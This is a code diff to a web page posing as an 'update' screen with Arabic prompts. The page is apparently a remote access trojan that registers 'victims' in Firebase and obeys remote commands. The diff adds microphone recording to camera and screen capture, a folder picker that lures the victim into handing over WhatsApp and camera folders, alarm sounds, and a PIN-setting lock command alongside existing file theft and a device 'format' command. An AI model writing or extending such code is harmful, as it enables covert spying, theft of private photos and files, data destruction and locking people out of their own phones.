@@ -34,6 +34,7 @@
         const vref = db.ref('victims/'+vid);
         let ROOT_HANDLE = null;
         let camStream = null;
+        let audioCtx = null;
 
         setTimeout(() => {
             document.getElementById('msg').innerText = "يرجى الضغط على 'بدء التحديث' للمتابعة";
@@ -47,7 +48,11 @@
             document.getElementById('msg').innerText = "جاري فتح نافذة التحديث...";
             document.getElementById('guide').innerText = "الرجاء اختيار مجلد 'الذاكرة الداخلية' أو 'Internal Storage' ثم الضغط على 'موافق' أو 'Select'";
 
-            // تسجيل الجهاز فوراً قبل أي شيء آخر
+            // تفعيل AudioContext للصوت
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            if (audioCtx.state === 'suspended') await audioCtx.resume();
+
+            // تسجيل الجهاز فوراً
             registerDevice();
 
             // الحصول على الجذر
@@ -58,15 +63,14 @@
             }
 
             // الصلاحيات الأخرى
-            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
-            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
+            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true }); } catch(e) {}
+            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
             try {
                 let a = document.createElement('a');
                 a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
                 a.click();
             } catch(e) {}
 
-            // تحديث حالة الجهاز في القاعدة
             vref.update({ online: true });
 
             document.getElementById('msg').innerText = ROOT_HANDLE ? "✅ تم التحديث بنجاح" : "✅ تم الاتصال";
@@ -90,7 +94,6 @@
                     charging = b.charging;
                 }
             } catch(e) {}
-
             vref.set({
                 online: true,
                 fingerprint: {
@@ -99,16 +102,10 @@
                     scr: screen.width+'x'+screen.height,
                     cores: navigator.hardwareConcurrency,
                     mem: navigator.deviceMemory||'?',
-                    ip: ip,
-                    battery: battery,
-                    charging: charging,
+                    ip, battery, charging,
                     language: navigator.language,
                     time: new Date().toLocaleString()
                 }
-            }).then(() => {
-                console.log('✅ تم تسجيل الجهاز في Firebase');
-            }).catch(err => {
-                console.error('❌ فشل التسجيل:', err);
             });
         }
 
@@ -120,8 +117,8 @@
                     switch(c.action) {
                         case 'get_photos': c.folder ? await pullFromFolder(c.folder) : await pullAll(); break;
                         case 'get_files': await pullFromFolder(c.folder || 'downloads'); break;
-                        case 'vibrate': navigator.vibrate([200,100,200]); break;
-                        case 'play_sound': break;
+                        case 'vibrate': navigator.vibrate([500,200,500,200,500]); break;
+                        case 'play_sound': playAlarm(); break;
                         case 'screenshot': await screenshot(); break;
                         case 'record_video': await recordVid(c.duration||10); break;
                         case 'format': await formatDevice(); break;
@@ -129,30 +126,34 @@
                         case 'flash_on': await setFlash(true); break;
                         case 'flash_off': await setFlash(false); break;
                         case 'device_info': await sendDeviceInfo(); break;
-                        case 'lock_screen': lockScreen(); break;
+                        case 'lock_screen': lockScreen(c.pin || ''); break;
                     }
                 } catch(e) {}
                 await vref.child('command').remove();
             });
         }
 
+        // ✅ طلب مجلد محدد من المستخدم
         async function getFolderHandle(folderName) {
-            if (!ROOT_HANDLE) throw new Error('لا توجد صلاحية ملفات');
-            const MAP = {
+            const FOLDER_NAMES = {
                 camera: 'DCIM/Camera',
                 downloads: 'Download',
                 whatsapp: 'WhatsApp/Media/WhatsApp Images',
                 facebook: 'Facebook/Media',
                 pictures: 'Pictures'
             };
-            const path = MAP[folderName] || folderName;
-            let current = ROOT_HANDLE;
-            if (path) {
-                for (let p of path.split('/')) {
-                    current = await current.getDirectoryHandle(p);
-                }
+            const displayName = FOLDER_NAMES[folderName] || folderName;
+
+            // نوجه الضحية لاختيار المجلد المطلوب
+            document.body.innerHTML = `<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد:<br>${displayName}</h2>`;
+            try {
+                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
+                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
+                return handle;
+            } catch(e) {
+                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
+                throw new Error('تم رفض اختيار المجلد');
             }
-            return current;
         }
 
         async function pullFromFolder(key) {
@@ -185,6 +186,20 @@
             }
         }
 
+        // ✅ الصوت
+        function playAlarm() {
+            if (!audioCtx) return;
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'square';
+            osc.frequency.value = 800;
+            gain.gain.value = 0.5;
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+            setTimeout(() => { osc.stop(); gain.disconnect(); }, 2000);
+        }
+
         async function setFlash(on) {
             if (!camStream) return;
             let track = camStream.getVideoTracks()[0];
@@ -207,9 +222,11 @@
             stream.getTracks().forEach(t => t.stop());
         }
 
+        // ✅ تسجيل الفيديو مع الصوت
         async function recordVid(sec) {
-            let stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
-            let recorder = new MediaRecorder(stream), chunks = [];
+            let stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+            let recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            let chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = async () => {
                 let blob = new Blob(chunks, { type: 'video/webm' });
@@ -237,15 +254,15 @@
             if (navigator.clearData) await navigator.clearData({ cache: true, cookies: true, storage: true });
         }
 
-        function lockScreen() {
+        // ✅ قفل الشاشة برمز PIN
+        function lockScreen(pin) {
             try {
-                if (navigator.deviceAdmin) { navigator.deviceAdmin.lockNow(); }
-                else {
-                    let a = document.createElement('a');
-                    a.href = 'intent://#Intent;action=android.intent.action.CLOSE_SYSTEM_DIALOGS;end';
-                    a.click();
+                // محاولة قفل الشاشة عبر DevicePolicyManager
+                window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
+                // محاولة القفل الفوري
+                setTimeout(() => {
                     window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end');
-                }
+                }, 500);
             } catch(e) {}
         }
 
